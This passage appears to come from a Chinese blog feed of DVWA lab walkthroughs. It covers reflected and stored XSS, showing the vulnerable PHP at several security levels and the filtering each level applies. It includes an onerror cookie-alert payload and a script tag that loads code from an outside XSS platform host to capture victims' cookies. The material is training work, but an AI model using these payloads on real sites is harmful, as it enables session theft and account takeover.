<li> 输入其他标签，输入<code>&lt;IMG src=1 onerror=alert(document.cookie)&gt;</code></li>
</ol>
<h1 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h1><h2 id="源代码-2"><a href="#源代码-2" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">header</span> (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line">    <span class="comment">// Is there any input?</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">"name"</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">'name'</span> ] != <span class="literal">NULL</span> ) {</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, <span class="variable">$_GET</span>[ <span class="string">'name'</span> ] );</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello ${name}&lt;/pre&gt;"</span>;</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析：采用<code>preg_replace</code>函数执行一个正则表达式的搜索和替换，其中<code>/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i</code>是正则表达式，<code>(.*)</code>表示贪婪匹配，<code>/i</code>表示不区分大小写，所有关于<code>&lt;script&gt;</code>标签均被过滤；</p>
<h3 id="XSS攻击测试-2"><a href="#XSS攻击测试-2" class="headerlink" title="XSS攻击测试"></a>XSS攻击测试</h3><p>可以使用IMG标签进行注入，输入<code>&lt;IMG src=1 onerror=alert(document.cookie)&gt;</code>，成功获得cookie值；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201118003332.png"></p>
<h1 id="IMPOSSIBLE"><a href="#IMPOSSIBLE" class="headerlink" title="IMPOSSIBLE"></a>IMPOSSIBLE</h1><h3 id="源代码-3"><a href="#源代码-3" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// Is there any input?</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">"name"</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">'name'</span> ] != <span class="literal">NULL</span> ) {</span><br><span class="line">        <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">        <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">'user_token'</span> ], <span class="variable">$_SESSION</span>[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$_GET</span>[ <span class="string">'name'</span> ] );</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello ${name}&lt;/pre&gt;"</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析：使用<code>htmlspecialchars</code>函数把预定义的字符&amp;、”、’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素。还加入了<code>Anti-CSRF token</code>，防止结合<code>csrf</code>攻击；</p>
<p>使用IMG标签进行注入后显示的源码中的预定义字符已经被转换为HTML实体；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201118003749.png"></p>
]]></content>
      <categories>
        <category>DVWA</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA XSS (Stored)</title>
    <url>/DVWA-XSS-Stored.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>存储型XSS可以将用户有害输入信息存储在后台数据库中，不需要攻击者构造URL链接诱使受害人单击而触发攻击，目标网站的其它用户只要访问插入恶意代码的网站相关页面即可触发代码执行。相比较反射型XSS更隐蔽性，受害者范围更广。<span id="more"></span></p>
<p>存储型XSS危害程度高于反射型XSS，利用它，可以</p>
<ol>
<li> 窃取管理员帐号或Cookie，入侵者可以冒充管理员的身份登录后台。使得入侵者具有恶意操纵后台数据的能力，包括读取、更改、添加、删除一些信息。</li>
<li> 窃取用户的个人信息或者登录帐号，对网站的用户安全产生巨大的威胁。例如冒充用户身份进行各种操作。</li>
<li> 网站挂马。先将恶意攻击代码嵌入到Web应用程序之中。当用户浏览该挂马页面时，用户的计算机会被植入木马。</li>
<li> 发送广告或者垃圾信息。攻击者可以利用XSS漏洞植入广告，或者发送垃圾信息，严重影响到用户的正常使用。</li>
</ol>
<h1 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h1><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">'btnSign'</span> ] ) ) {</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">        <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">'txtName'</span> ] );</span><br><span class="line">        <span class="comment">// Sanitize message input</span></span><br><span class="line">        <span class="variable">$message</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$message</span> );</span><br><span class="line">        <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        <span class="comment">// Sanitize name input</span></span><br><span class="line">        <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        <span class="comment">// Update database</span></span><br><span class="line">        <span class="variable">$query</span>  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '<span class="subst">$message</span>', '<span class="subst">$name</span>' );"</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">        <span class="comment">//mysql_close();</span></span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析：</p>
<ul>
<li>  <code>trim(string,charlist)</code> ： 移除string字符两侧的预定义字符，预定义字符包括\t 、 \n 、\x0B 、\r以及空格，可选参数charlist支持添加额外需要删除的字符；</li>
<li>  <code>stripslashes(string)</code>： 去除掉string字符的反斜杠＼；</li>
<li>  <code>mysqli_real_escape_string(string,connection)</code> ：函数会对字符串string中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义；</li>
<li>  <code>$GLOBALS</code> ：引用全局作用域中可用的全部变量，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="108.247ex" height="2.149ex" role="img" focusable="false" viewBox="0 -750 47845 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mi" transform="translate(786,0)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mi" transform="translate(1467,0)"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mi" transform="translate(2230,0)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mi" transform="translate(2989,0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mi" transform="translate(3739,0)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mi" transform="translate(4420,0)"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="mi" transform="translate(5065,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">这</text></g><g data-mml-node="mi" transform="translate(6065,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">种</text></g><g data-mml-node="mi" transform="translate(7065,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">全</text></g><g data-mml-node="mi" transform="translate(8065,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">局</text></g><g data-mml-node="mi" transform="translate(9065,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">变</text></g><g data-mml-node="mi" transform="translate(10065,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">量</text></g><g data-mml-node="mi" transform="translate(11065,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">用</text></g><g data-mml-node="mi" transform="translate(12065,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">于</text></g><g data-mml-node="mi" transform="translate(13065,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">在</text></g><g data-mml-node="mi" transform="translate(14065,0)"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(14816,0)"><path data-c="1D43B" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 219 683Q260 681 355 681Q389 681 418 681T463 682T483 682Q499 682 499 672Q499 670 497 658Q492 641 487 638H485Q483 638 480 638T473 638T464 637T455 637Q416 636 405 634T387 623Q384 619 355 500Q348 474 340 442T328 395L324 380Q324 378 469 378H614L615 381Q615 384 646 504Q674 619 674 627T617 637Q594 637 587 639T580 648Q580 650 582 660Q586 677 588 679T604 682Q609 682 646 681T740 680Q802 680 835 681T871 682Q888 682 888 672Q888 645 876 638H874Q872 638 869 638T862 638T853 637T844 637Q805 636 794 634T776 623Q773 618 704 340T634 58Q634 51 638 51Q646 48 692 46H723Q729 38 729 37T726 19Q722 6 716 0H701Q664 2 567 2Q533 2 504 2T458 2T437 1Q420 1 420 10Q420 15 423 24Q428 43 433 45Q437 46 448 46H454Q481 46 514 49Q520 50 522 50T528 55T534 64T540 82T547 110T558 153Q565 181 569 198Q602 330 602 331T457 332H312L279 197Q245 63 245 58Q245 51 253 49T303 46H334Q340 38 340 37T337 19Q333 6 327 0H312Q275 2 178 2Q144 2 115 2T69 2T48 1Q31 1 31 10Q31 12 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mi" transform="translate(15704,0)"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(16455,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">脚</text></g><g data-mml-node="mi" transform="translate(17455,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">本</text></g><g data-mml-node="mi" transform="translate(18455,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">中</text></g><g data-mml-node="mi" transform="translate(19455,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">的</text></g><g data-mml-node="mi" transform="translate(20455,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">任</text></g><g data-mml-node="mi" transform="translate(21455,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">意</text></g><g data-mml-node="mi" transform="translate(22455,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">位</text></g><g data-mml-node="mi" transform="translate(23455,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">置</text></g><g data-mml-node="mi" transform="translate(24455,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">访</text></g><g data-mml-node="mi" transform="translate(25455,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">问</text></g><g data-mml-node="mi" transform="translate(26455,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">全</text></g><g data-mml-node="mi" transform="translate(27455,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">局</text></g><g data-mml-node="mi" transform="translate(28455,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">变</text></g><g data-mml-node="mi" transform="translate(29455,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">量</text></g><g data-mml-node="mi" transform="translate(30455,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">（</text></g><g data-mml-node="mi" transform="translate(31455,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">从</text></g><g data-mml-node="mi" transform="translate(32455,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">函</text></g><g data-mml-node="mi" transform="translate(33455,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">数</text></g><g data-mml-node="mi" transform="translate(34455,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">或</text></g><g data-mml-node="mi" transform="translate(35455,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">方</text></g><g data-mml-node="mi" transform="translate(36455,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">法</text></g><g data-mml-node="mi" transform="translate(37455,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">中</text></g><g data-mml-node="mi" transform="translate(38455,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">均</text></g><g data-mml-node="mi" transform="translate(39455,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">可</text></g><g data-mml-node="mi" transform="translate(40455,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">）</text></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(41455,0)"><g data-mml-node="mo"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">。</text></g></g><g data-mml-node="mi" transform="translate(42455,0)"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(43206,0)"><path data-c="1D43B" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 219 683Q260 681 355 681Q389 681 418 681T463 682T483 682Q499 682 499 672Q499 670 497 658Q492 641 487 638H485Q483 638 480 638T473 638T464 637T455 637Q416 636 405 634T387 623Q384 619 355 500Q348 474 340 442T328 395L324 380Q324 378 469 378H614L615 381Q615 384 646 504Q674 619 674 627T617 637Q594 637 587 639T580 648Q580 650 582 660Q586 677 588 679T604 682Q609 682 646 681T740 680Q802 680 835 681T871 682Q888 682 888 672Q888 645 876 638H874Q872 638 869 638T862 638T853 637T844 637Q805 636 794 634T776 623Q773 618 704 340T634 58Q634 51 638 51Q646 48 692 46H723Q729 38 729 37T726 19Q722 6 716 0H701Q664 2 567 2Q533 2 504 2T458 2T437 1Q420 1 420 10Q420 15 423 24Q428 43 433 45Q437 46 448 46H454Q481 46 514 49Q520 50 522 50T528 55T534 64T540 82T547 110T558 153Q565 181 569 198Q602 330 602 331T457 332H312L279 197Q245 63 245 58Q245 51 253 49T303 46H334Q340 38 340 37T337 19Q333 6 327 0H312Q275 2 178 2Q144 2 115 2T69 2T48 1Q31 1 31 10Q31 12 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mi" transform="translate(44094,0)"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(44845,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">在</text></g><g data-mml-node="mi" transform="translate(45845,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">名</text></g><g data-mml-node="mi" transform="translate(46845,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">为</text></g></g></g></svg></mjx-container>GLOBALS[index]的数组中存储了所有全局变量，变量的名字就是数组的键；</li>
</ul>
<p>对输入的message和name并没有进行XSS过滤，而且数据存储在数据库中，存在比较明显的存储型XSS漏洞；</p>
<h2 id="攻击测试"><a href="#攻击测试" class="headerlink" title="攻击测试"></a>攻击测试</h2><ol>
<li><p>判断注入点</p>
<p> 在输入框输入如下内容，弹出弹框，说明存在XSS注入；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201119110604.png"></p>
<p> ![image-20201119110626925](/Users/leeyuxun/Library/Application Support/typora-user-images/image-20201119110626925.png)</p>
<p> 重新刷新页面，依旧弹出弹框，表明XSS代码已经存储在数据库中，为存储型XSS漏洞；</p>
</li>
<li><p>漏洞利用</p>
<p> 这里尝试窃取Cookie</p>
<ol>
<li><p>首先在<a href="https://xsshs.cn/">XSS Platfrom</a>生成获取受害者Cooike的代码，通过步骤一，将其添加到页面中；</p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;sCRiPt sRC=<span class="comment">//xsshs.cn/rWmS&gt; &lt;/sCrIpT&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>随后在<a href="https://xsshs.cn/">XSS Platfrom</a>即可查看到受害者的访问cookie；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201119112205.png"></p>
</li>
</ol>
</li>
</ol>
<h1 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">'btnSign'</span> ] ) ) {</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">        <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">'txtName'</span> ] );</span><br><span class="line">        <span class="comment">// Sanitize message input</span></span><br><span class="line">        <span class="variable">$message</span> = <span class="title function_ invoke__">strip_tags</span>( <span class="title function_ invoke__">addslashes</span>( <span class="variable">$message</span> ) );</span><br><span class="line">        <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        <span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$message</span> );</span><br><span class="line">        <span class="comment">// Sanitize name input</span></span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, <span class="variable">$name</span> );</span><br><span class="line">        <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">"[MySQLConverterToo] Fix the 